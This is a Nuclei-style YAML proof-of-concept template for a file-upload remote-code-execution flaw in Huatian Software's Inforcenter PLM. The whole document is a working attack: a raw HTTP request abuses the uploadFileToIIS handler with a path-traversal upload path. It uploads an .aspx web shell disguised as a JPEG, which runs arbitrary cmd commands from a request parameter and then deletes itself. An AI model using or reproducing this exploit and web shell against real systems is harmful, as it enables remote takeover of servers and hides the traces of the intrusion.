id: poc-dblgobtf7dbv9im3
info:
  name: 华天软件Inforcenter PLM uploadFileToIIS 文件上传致RCE漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: rce,file-upload,2025
http:
- raw:
  - 'POST /Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/ HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

    Accept: */*

    Connection: close


    ------WebKitFormBoundaryFfJZ4PlAZBixjELj

    Content-Disposition: form-data; name="file"; filename="1.aspx"

    Content-Type: image/jpeg


    <%@ Page Language="Jscript" validateRequest="false" %>

    <%

    var c=new System.Diagnostics.ProcessStartInfo("cmd");

    var e=new System.Diagnostics.Process();

    var out:System.IO.StreamReader,EI:System.IO.StreamReader;

    c.UseShellExecute=false;

    c.RedirectStandardOutput=true;

    c.RedirectStandardError=true;

    e.StartInfo=c;

    c.Arguments="/c " + Request.Item["cmd"];

    e.Start();

    out=e.StandardOutput;

    EI=e.StandardError;

    e.Close();

    Response.Write(out.ReadToEnd() + EI.ReadToEnd());

    System.IO.File.Delete(Request.PhysicalPath);

    Response.End();%>

    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
